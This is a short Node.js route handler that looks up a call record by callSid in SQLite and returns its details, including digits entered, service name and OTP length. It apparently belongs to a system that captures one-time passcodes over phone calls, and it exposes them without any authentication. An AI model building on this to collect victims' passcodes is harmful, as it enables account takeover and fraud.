module.exports = function (req, res) {
  // Import the sqlite3 module and enable verbose mode for detailed error messages.
  const sqlite3 = require("sqlite3").verbose();
  
  // Create a new database object pointing to the specified database file.
  const db = new sqlite3.Database("./db/data.db");
  
  // Extract the callSid from the request body.
  const callSid = req.body.callSid;
  
  // Query the database to check if the callSid exists.
  db.get("SELECT callSid FROM calls WHERE callSid = ?", [callSid], (err, row) => {
    if (err) {
      // Log any error that occurs during the query.
      return console.log(err.message);
    }
    
    if (row === undefined) {
      // If the callSid is not found, send a response with an error message.
      res.status(200).json({
        error: "Invalid callSid."
      });
    } else {
      // If the callSid is found, query the database to get all details for the call.
      db.get("SELECT * FROM calls WHERE callSid = ?", [callSid], (err, callDetails) => {
        if (err) {
          // Log any error that occurs during the query.
          return console.error(err.message);
        }
        
        // Send a response with the call details.
        res.status(200).json({
          itsto: callDetails.itsto,
          itsfrom: callDetails.itsfrom,
          callSid: callDetails.callSid,
          digits: callDetails.digits,
          status: callDetails.status,
          date: callDetails.date,
          user: callDetails.user,
          service: callDetails.service,
          otplength: callDetails.otplength
        });
      });
    }
  });
};
